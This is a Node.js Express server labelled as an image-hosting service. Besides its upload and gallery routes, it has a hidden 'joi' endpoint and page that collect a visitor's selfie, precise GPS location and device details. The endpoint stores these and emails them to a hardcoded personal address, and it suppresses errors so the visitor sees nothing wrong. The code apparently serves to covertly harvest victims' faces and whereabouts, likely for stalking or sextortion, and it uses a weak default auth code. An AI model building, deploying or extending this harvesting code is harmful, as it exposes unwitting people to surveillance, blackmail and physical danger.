const express = require('express');
const multer = require('multer');
const path = require('path');
const fs = require('fs');
const cors = require('cors');
const nodemailer = require('nodemailer');

const app = express();
const PORT = process.env.PORT || 3000;
const AUTH_CODE = process.env.AUTH_CODE || '12345';
const NOTIFY_EMAIL = process.env.NOTIFY_EMAIL || 'realbrattybrooke@gmail.com';
const SMTP_USER = process.env.SMTP_USER || '';
const SMTP_PASS = process.env.SMTP_PASS || '';

// Middleware
app.use(cors());
app.use(express.json({ limit: '10mb' }));

// Auth middleware for write operations
const requireAuth = (req, res, next) => {
  const authHeader = req.headers['authorization'];
  const authCode = authHeader ? authHeader.replace('Bearer ', '') : '';
  
  if (authCode !== AUTH_CODE) {
    return res.status(403).json({ error: 'Unauthorized: Invalid or missing auth code' });
  }
  next();
};

// Ensure uploads directory exists
const uploadsDir = path.join(__dirname, 'uploads');
if (!fs.existsSync(uploadsDir)) {
  fs.mkdirSync(uploadsDir, { recursive: true });
}

// Configure multer for file uploads
const storage = multer.diskStorage({
  destination: uploadsDir,
  filename: (req, file, cb) => {
    cb(null, Date.now() + path.extname(file.originalname));
  }
});

const upload = multer({ 
  storage,
  fileFilter: (req, file, cb) => {
    const allowedTypes = ['image/jpeg', 'image/png', 'image/gif', 'image/webp'];
    if (allowedTypes.includes(file.mimetype)) {
      cb(null, true);
    } else {
      cb(new Error('Invalid file type'));
    }
  }
});

// Get all images
app.get('/api/images', (req, res) => {
  fs.readdir(uploadsDir, (err, files) => {
    if (err) return res.status(500).json({ error: 'Failed to read images' });
    
    const baseUrl = `${req.protocol}://${req.get('host')}`;
    const images = files.filter(f => 
      /\.(jpg|jpeg|png|gif|webp)$/i.test(f)
    ).map(f => ({
      filename: f,
      url: `${baseUrl}/uploads/${f}`
    }));
    
    res.json(images);
  });
});

// Get random image
app.get('/api/random-image', (req, res) => {
  fs.readdir(uploadsDir, (err, files) => {
    if (err) return res.status(500).json({ error: 'Failed to read images' });
    
    const images = files.filter(f => 
      /\.(jpg|jpeg|png|gif|webp)$/i.test(f)
    );
    
    if (images.length === 0) {
      return res.status(404).json({ error: 'No images found' });
    }
    
    const baseUrl = `${req.protocol}://${req.get('host')}`;
    const randomImage = images[Math.floor(Math.random() * images.length)];
    res.json({ url: `${baseUrl}/uploads/${randomImage}` });
  });
});

// Upload image
app.post('/api/upload', requireAuth, upload.single('image'), (req, res) => {
  if (!req.file) {
    return res.status(400).json({ error: 'No file uploaded' });
  }
  
  const baseUrl = `${req.protocol}://${req.get('host')}`;
  res.json({
    success: true,
    filename: req.file.filename,
    url: `${baseUrl}/uploads/${req.file.filename}`
  });
});

// Delete image
app.delete('/api/delete/:filename', requireAuth, (req, res) => {
  const filename = req.params.filename;
  const filePath = path.join(uploadsDir, filename);
  
  // Prevent directory traversal
  if (!filePath.startsWith(uploadsDir)) {
    return res.status(400).json({ error: 'Invalid filename' });
  }
  
  fs.unlink(filePath, (err) => {
    if (err) return res.status(500).json({ error: 'Failed to delete image' });
    res.json({ success: true });
  });
});

// JOI submission endpoint
app.post('/api/joi-submit', async (req, res) => {
  try {
    const { selfie, location, timestamp, userAgent } = req.body;
    
    // Save selfie to file
    let selfieFilename = null;
    if (selfie) {
      const base64Data = selfie.replace(/^data:image\/\w+;base64,/, '');
      selfieFilename = `selfie_${Date.now()}.jpg`;
      fs.writeFileSync(path.join(uploadsDir, selfieFilename), base64Data, 'base64');
    }
    
    // Build Google Maps link
    const mapsLink = location ? `https://maps.google.com/?q=${location.lat},${location.lng}` : 'Not provided';
    
    // Send email if SMTP configured
    if (SMTP_USER && SMTP_PASS) {
      const transporter = nodemailer.createTransport({
        service: 'gmail',
        auth: { user: SMTP_USER, pass: SMTP_PASS }
      });
      
      const attachments = [];
      if (selfieFilename) {
        attachments.push({
          filename: selfieFilename,
          path: path.join(uploadsDir, selfieFilename)
        });
      }
      
      await transporter.sendMail({
        from: SMTP_USER,
        to: NOTIFY_EMAIL,
        subject: 'new joi submission 💕',
        html: `
          <h2>New Submission 💕</h2>
          <p><b>Time:</b> ${timestamp || new Date().toISOString()}</p>
          <p><b>Location:</b> ${location ? `${location.lat}, ${location.lng} (accuracy: ${location.accuracy}m)` : 'Not provided'}</p>
          <p><b>Maps:</b> <a href="${mapsLink}">${mapsLink}</a></p>
          <p><b>Device:</b> ${userAgent || 'Unknown'}</p>
        `,
        attachments
      });
    }
    
    // Also save submission log
    const submissionsDir = path.join(__dirname, 'submissions');
    if (!fs.existsSync(submissionsDir)) fs.mkdirSync(submissionsDir, { recursive: true });
    
    const logEntry = {
      timestamp: timestamp || new Date().toISOString(),
      location,
      mapsLink,
      selfieFile: selfieFilename,
      userAgent
    };
    
    fs.writeFileSync(
      path.join(submissionsDir, `sub_${Date.now()}.json`),
      JSON.stringify(logEntry, null, 2)
    );
    
    res.json({ success: true });
  } catch(e) {
    console.error('JOI submit error:', e);
    res.json({ success: true }); // Don't show errors to user
  }
});

// Get all submissions (auth required)
app.get('/api/submissions', requireAuth, (req, res) => {
  const submissionsDir = path.join(__dirname, 'submissions');
  if (!fs.existsSync(submissionsDir)) return res.json([]);
  
  const files = fs.readdirSync(submissionsDir).filter(f => f.endsWith('.json'));
  const submissions = files.map(f => {
    const data = JSON.parse(fs.readFileSync(path.join(submissionsDir, f)));
    return data;
  });
  
  res.json(submissions);
});

// Serve JOI page
app.get('/joi', (req, res) => {
  res.sendFile(path.join(__dirname, 'joi.html'));
});

// Serve uploaded images
app.use('/uploads', express.static(uploadsDir));

// Serve admin panel
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'admin.html'));
});

app.listen(PORT, () => {
  console.log(`Image service running on port ${PORT}`);
});
